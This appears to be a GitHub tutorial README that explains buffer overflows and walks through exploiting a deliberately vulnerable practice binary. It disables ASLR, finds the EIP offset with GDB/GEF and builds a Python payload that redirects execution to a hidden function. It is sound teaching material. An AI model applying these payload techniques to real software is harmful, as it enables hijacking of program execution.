# BufferOverflow

### A buffer overflow occurs when a program writes more data to a buffer (a memory area) than it can handle. This can overwrite important data and, in some cases, allow an attacker to execute malicious code.

![buof](https://github.com/user-attachments/assets/3d8a435a-c7b6-4119-920d-7dd348a57bd7)

## How it happens:

-Buffer: A reserved area in memory for storing data.

-Overflow: If the program does not check the size of the data, it can overwrite adjacent memory areas.

## Consequences:

-Data corruption and program crashes.

-Execution of malicious code if an attacker exploits the vulnerability.

## Prevention:

-Validate data sizes.

-Use safe functions.

-Implement protections like ASLR and DEP.


# Introduction to Buffer Overflow: Invoking Functions via Buffer Overflows

To begin, we'll explore how a buffer overflow can be exploited to invoke a specific function within a program. This process involves manipulating memory to redirect the program's execution flow to a desired function.

To practice this buffer overflow case, we will use a C program called `secret.c` and compile it with the following command:

```bash
gcc -g -fno-stack-protector -z execstack -m32 secret.c -o secret
```

Address Space Layout Randomization (ASLR) is a security technique that randomizes memory addresses to protect against certain attacks. 

To check if ASLR is active for our binary `secret`:

```bash
ldd secret
```

![bof1](https://github.com/user-attachments/assets/b9b05657-b76e-42f0-be63-0a7759525270)

ASLR is set to 2 by default. To disable ASLR for easier buffer overflow exploitation, run:
```bash
sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```
This change will persist until the next reboot.


The binary `secret` prompts for user input with the message "Input your data:". When the input exceeds the expected number of characters, it triggers a segmentation fault due to a buffer overflow. This occurs because the program does not properly handle or validate the input size, causing it to overwrite adjacent memory areas.

![bof2](https://github.com/user-attachments/assets/e125c018-af9f-452f-9b70-f674d8443765)


To perform the buffer overflow, we will use GDB with GEF (GDB Enhanced Features).
You can find the GEF repository at: https://github.com/hugsy/gef

To run the binary with GDB, use the command:
```bash
gdb ./secret
```

To determine the offset (how many A's you need to input to reach and overwrite the EIP), we will use the command pattern create:

```bash
pattern create
```

![bof3](https://github.com/user-attachments/assets/082c49a1-9cee-42c8-937e-0754cef063f0)

Generate a pattern of characters that we can use to determine the offset when running the program. Instead of using just a series of A's, we’ll run the program with this character pattern.

We would run it with:

```bash
r <<< 'character_pattern'
```
The `<<<` operator is used to provide a string directly as input to a command or program.

Now we can determine how many characters are needed to reach the EIP using the following command:

```bash
pattern offset $eip
```

![bof4](https://github.com/user-attachments/assets/efc4ef08-fe89-4867-ae3e-94fde127d566)

In this case, the offset is 76, so we can run the following command to verify that the characters are correct and that we will overwrite the EIP with the value BBBB:

```bash
r <<< $(python3 -c 'print("A"*76 + "B"*4)')
```

The **EIP** (Extended Instruction Pointer) is a CPU register that tracks the address of the next instruction to execute, and in a buffer overflow attack, overwriting it allows you to control the execution flow by redirecting it to your chosen code or exploit.

![bof5](https://github.com/user-attachments/assets/678690d1-cab5-4ae4-bf91-ee8b46e88df7)

Additionally, the `checksec` command in GDB checks security features like `NX (No Execute)` protection, which prevents code from running in certain memory regions. It helps you see which security mechanisms are active for a binary.

![bof6](https://github.com/user-attachments/assets/1979e547-2ef8-48ce-89b9-6f41f73d450b)

In our case, we want to execute the function named `secret` that is within the binary. To achieve this, we’ll use the command `p secret` to get the address of the `secret` function. We can then overwrite the EIP with this address to redirect execution to the `secret` function.

```bash
p FUNCTION_NAME
```

![bof7](https://github.com/user-attachments/assets/d9084be8-73a6-403f-8efa-37d090c98736)

Now, we need to format the address in **little-endian** (e.g., `0x080484b6` as `\xb6\x84\x04\x08`) because systems store multi-byte values in this order, ensuring the function is executed correctly.

In our case it will be: 0x5655619d -> \x9d\x61\x55\x56

We will now create the payload using `sys.stdout.buffer.write()` instead of `print()` because it writes the data as raw bytes, ensuring that each byte is preserved exactly as needed. This is crucial for accurately overwriting the EIP with the correct memory address, especially when handling non-printable characters in the exploit.

Next, we'll execute the binary with our crafted payload using the command:

```bash
./secret $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\x9d\x61\x55\x56")')
```

This command runs the `secret` binary while injecting the payload directly, aiming to overwrite the EIP with the address of the `secret` function.

![bof8](https://github.com/user-attachments/assets/8cb7ccb8-7d12-4270-b767-9bd6c8cb6e26)

As a result, the function was executed, printing the message "You have exploited the buffer overflow!" before the program crashed with a segmentation fault.

You can also save the payload in a Python script and execute it when running the `secret` binary, simplifying the injection process.

```python3
import sys

secret_func_address = b'\x9d\x61\x55\x56'
payload = b'A' * 76 + secret_func_address

sys.stdout.buffer.write(payload)
```

![bof9](https://github.com/user-attachments/assets/52f80186-b3d2-4e3d-a361-28f8dbb49a01)

